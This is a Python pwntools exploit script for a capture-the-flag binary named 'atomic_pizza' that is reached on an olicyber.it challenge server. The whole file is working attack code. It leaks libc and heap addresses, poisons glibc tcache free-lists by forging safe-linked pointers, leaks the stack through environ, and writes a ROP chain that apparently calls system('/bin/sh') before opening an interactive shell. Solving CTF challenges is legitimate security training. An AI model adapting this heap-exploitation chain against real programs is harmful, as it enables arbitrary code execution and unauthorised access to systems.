import os
from pwn import *

exe = ELF("./atomic_pizza")

context.binary = exe

HOST = "atomic-pizza.challs.olicyber.it"
PORT = 16010

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

POP_RDI = 0x2a3e5
RET = 0x29cd6

def create_slice(r, index, topping, size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % size)
    r.recvuntil(b"> ")
    
    if size == len(topping):
        r.send(topping)
    else:
        r.sendline(topping)

    r.recvuntil(b"> ")
    r.sendline(b"%d" % index)
        
def eat_slice(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"> ")
    r.sendline(b"y")

def spin_pizza(r):
    r.recvuntil(b"> ")
    r.sendline(b"5")
    r.recvuntil(b"> ")
    r.sendline(b"")
    r.recvuntil(b"> ")
    r.sendline(b"")

    r.recvuntil(b"> ")
    result = r.recvuntil(b"\n----")[:-5]
    return result

def edit_favorite_slice(r, new_topping, size):
    r.recvuntil(b"> ")
    r.sendline(b"7")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % size)
    r.recvuntil(b"> ")
    r.sendline(new_topping)

def get_right_slice(r):
    leak = spin_pizza(r)
    while not leak.startswith(b"palle"):
        leak = spin_pizza(r)

    return leak

def leak_libc_and_heap(r):
    fake_slice1 = p16(0x1000) + b"palle"
    create_slice(r, 1, b"a" * (0x0e) + fake_slice1, 0x15)

    create_slice(r, 2, b"a" * 4, 0x25)
    create_slice(r, 3, b"a" * 4, 0x25)
    create_slice(r, 4, b"a" * 4, 0x35)
    create_slice(r, 5, b"a" * 4, 0x35)
    
    create_slice(r, 6, b"a" * 4, 0x4fd)
    create_slice(r, 7, b"a" * 4, 0x15)
    
    for i in range(2, 7):
        eat_slice(r, i)
        
    leak = get_right_slice(r)
    
    next1 = u64(leak[0x0e: 0x16])
    next2 = u64(leak[0x3e: 0x46])

    heap_base = (next1 ^ next2) - 0x2c0
    libc_leak = u64(leak[0x20e : 0x216])

    return libc_leak - 0x219ce0, heap_base

def leak_stack(r, libc_base, heap_base):
    fake_slice1 = heap_base + 0x2b0
    chunk3 = heap_base + 0x2f0
    chunk5 = heap_base + 0x360
    future_arbitrary_alloc = heap_base + 0x510
    target_allocation = 0x221200 - 0x30 + libc_base

    payload = b"a" * (chunk3 - fake_slice1 - 0x8 - 2)
    payload += p64(0x31)
    payload += p64((chunk3 >> 12) ^ target_allocation)
    payload = payload.ljust(chunk5 - fake_slice1 - 0x8 - 2, b"A")
    payload += p64(0x41)
    payload += p64((chunk5 >> 12) ^ future_arbitrary_alloc)

    edit_favorite_slice(r, payload, 0x1000 - 1)

    create_slice(r, 2, b"a" * 4, 0x25)
    fake_slice2 = p16(0x20) + b"palle"
    create_slice(r, 3, b"a" * (0x1e) + fake_slice2, 0x25)
    eat_slice(r, 1)
    eat_slice(r, 7)

    leak = get_right_slice(r)

    return u64(leak[0x0e: 0x16])

def write_rop(r, heap_base, environ, libc_base):
    create_slice(r, 4, b"a" * 4, 0x55)
    create_slice(r, 5, b"a" * 4, 0x55)

    eat_slice(r, 4)
    eat_slice(r, 5)

    create_slice(r, 4, b"a" * 4, 0x35)

    chunk5 = heap_base + 0x520
    stack_allocation = environ - 0x128

    payload = b"a" * 0x6 + p64(0x61) + p64(
        (chunk5 >> 12) ^ stack_allocation
    )

    create_slice(r, 5, payload, 0x35)
    create_slice(r, 6, b"a" * 4, 0x55)

    rop = (
        b"a" * 0x6
        + p64(POP_RDI + libc_base)
        + p64(0x1d8698 + libc_base)
        + p64(RET + libc_base)
        + p64(0x50d60 + libc_base)
    )

    create_slice(r, 7, rop, 0x55)

    r.recvuntil(b"> ")
    r.sendline(b"8")
    
def main():
    r = conn()

    libc_base, heap_base = leak_libc_and_heap(r)

    environ = leak_stack(r, libc_base, heap_base)
    write_rop(r, heap_base, environ, libc_base)

    r.recvuntil(b"Bye! :D\n")
    r.interactive()
    
if __name__ == "__main__":
    main()
